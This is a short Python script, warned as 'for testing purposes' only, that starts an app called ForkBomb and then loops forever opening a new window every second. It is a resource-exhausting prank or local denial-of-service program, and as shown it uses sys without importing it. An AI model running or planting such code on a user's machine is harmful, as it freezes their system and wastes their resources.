### DO NOT RUN THIS UNLESS FOR TESTING PURPOSES!!!

import os
import time

import fork_bomb_window as fork_bomb_window
from fork_bomb_window import *

fork_bomb = ForkBomb(application_id="com.touch-grass.Intro")
fork_bomb.run(sys.argv)

while True:
    time.sleep(1)
    window = ForkBombWindow()
    fork_bomb.add_window(window)

